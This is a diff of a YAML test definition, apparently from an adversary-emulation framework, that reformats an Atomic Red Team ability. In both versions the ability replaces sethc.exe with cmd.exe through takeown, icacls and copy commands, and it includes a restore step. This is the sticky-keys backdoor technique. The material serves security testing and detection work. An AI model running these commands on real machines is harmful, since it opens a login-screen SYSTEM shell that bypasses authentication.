@@ -1,17 +1,16 @@
-- id: 26f78c44-59c9-59cf-8492-cce692cff831
+- requirements: []
   name: Soumaia ART Tests - Replace binary of sticky keys
   description: Replace sticky keys binary (sethc.exe) with cmd.exe (requires elevation)
   tactic: privilege-escalation
-  technique:
-    attack_id: T1546.008
-    name: 'Event Triggered Execution: Accessibility Features'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
-          takeown /F C:\Windows\System32\sethc.exe /A
-          icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
-          copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
-        cleanup: |-
-          copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
+  technique_id: T1546.008
+  technique_name: 'Event Triggered Execution: Accessibility Features'
+  executors:
+  - cleanup:
+    - copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\sethc.exe /A & icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+  id: 26f78c44-59c9-59cf-8492-cce692cff831
